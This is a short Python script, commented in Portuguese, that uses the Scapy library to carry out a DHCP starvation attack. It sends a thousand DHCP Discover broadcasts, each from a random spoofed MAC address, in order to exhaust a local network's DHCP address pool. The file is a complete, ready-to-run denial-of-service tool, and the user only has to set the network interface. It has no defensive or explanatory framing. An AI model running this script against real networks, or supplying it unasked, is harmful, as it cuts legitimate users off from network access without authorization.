from scapy.all import *
import random
import time

def dhcp_starvation(interface, num_packets, delay):
    for _ in range(num_packets):
        # Gerar um endereço MAC aleatório
        mac_address = RandMAC()
        print(f"Sending DHCP Discover with MAC {mac_address}")

        # Construir o pacote DHCP Discover
        dhcp_discover = (
            Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac_address) /
            DHCP(options=[("message-type", "discover"), ("end")])
        )

        # Enviar o pacote DHCP Discover
        sendp(dhcp_discover, iface=interface, verbose=0)

        # Aguardar um pequeno intervalo entre os pacotes
        time.sleep(delay)

if __name__ == "__main__":
    interface = "eth0"   # Altere para a interface correta, por exemplo, "wlan0" ou "eth1"
    num_packets = 1000   # Ajuste conforme necessário
    delay = 0.1          # Ajuste conforme necessário

    dhcp_starvation(interface, num_packets, delay)
